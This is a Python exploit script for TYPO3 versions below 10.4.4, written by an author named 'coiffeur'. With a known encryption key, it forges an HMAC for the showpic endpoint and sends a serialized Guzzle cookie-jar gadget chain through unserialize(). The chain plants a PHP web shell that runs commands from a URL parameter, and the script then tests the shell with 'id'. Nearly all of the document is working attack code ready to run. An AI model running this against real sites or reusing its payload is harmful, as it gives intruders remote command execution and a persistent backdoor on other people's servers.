import hmac
import os
import sys
import requests
import subprocess
import random

DEBUG = 0
GENERATOR_NAME = "gen.php"
GENERATOR_CONTENT = """<?php
namespace GuzzleHttp\Cookie;

class SetCookie {
    private static $defaults = [
        'Name'     => null,
        'Value'    => null,
        'Domain'   => null,
        'Path'     => '/',
        'Max-Age'  => null,
        'Expires'  => null,
        'Secure'   => false,
        'Discard'  => false,
        'HttpOnly' => false
    ];
    private $data;

    public function __construct() {
        $this->data = array_replace(self::$defaults, ["Value" => "<?php system(\$_GET['cmd']); ?>", "Expires"  => 1]);
    }
}

class CookieJar {
    private $cookies;
    private $strictMode = false;

    public function __construct() {
        $this->cookies[] = new SetCookie();
    }
}

class FileCookieJar extends CookieJar {
    private $filename;
    private $storeSessionCookies = true;

    public function __construct($filename) {
        parent::__construct();
        $this->filename = $filename;
    }
}

$p[0] = 0;
$p[1] = new FileCookieJar($argv[1]);

$s = serialize($p);
$b = base64_encode($s);
echo $b;
"""


def usage():
    banner = """NAME: Typo3 < 10.4.4 RCE knowing encryptionKey
SYNOPSIS: python fw_10.4.3.py <BASE_URL> <ENCRYPTION_KEY>
DESCRIPTION:
    Exploit unserialize() (pre-auth) to write arbitrary file on the remote system.
AUTHOR: coiffeur
    """
    print(banner)


def gen_hmac(encryption_key, file_uid, parameters_encoded):
    message = f"{file_uid}|{parameters_encoded}"
    h = hmac.new(encryption_key.encode(),
                 message.encode(), digestmod='sha1')
    md5 = h.hexdigest()
    if DEBUG:
        print(f"Generating hmac:")
        print(f"    fileUid: {file_uid}")
        print(f"    parametersEncoded: {parameters_encoded}")
        print(f"    encryptionKey: {encryption_key}")
        print(f"[*] md5: {md5}")
    return md5


def generator(mode):
    if mode == 'c':
        with open(GENERATOR_NAME, "w") as f:
            f.write(GENERATOR_CONTENT)
    else:
        os.system(f"rm {GENERATOR_NAME}")


def gen_payload(filename):
    process = subprocess.Popen(
        ["php", GENERATOR_NAME, filename], stdout=subprocess.PIPE)
    output, _ = process.communicate()
    return output.decode()


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(usage())
        exit(-1)

    generator("c")
    filename = f'{random.randint(0, 10000)}.php'
    payload = gen_payload(filename)
    file_uid = "1"
    md5 = gen_hmac(sys.argv[2], file_uid, payload)
    
    r = requests.get(
        f"{sys.argv[1]}/index.php?eID=tx_cms_showpic&file={file_uid}&md5={md5}&parameters[0]={payload}")
    rc = requests.get(f"{sys.argv[1]}/{filename}?cmd=id")
    if rc.status_code == 200:
        print(f"[*] Exploit succed !")
        print(f"    {sys.argv[1]}/{filename}?cmd=id")
    else:
        print(f"[x] Exploit failed !")
    generator("r")
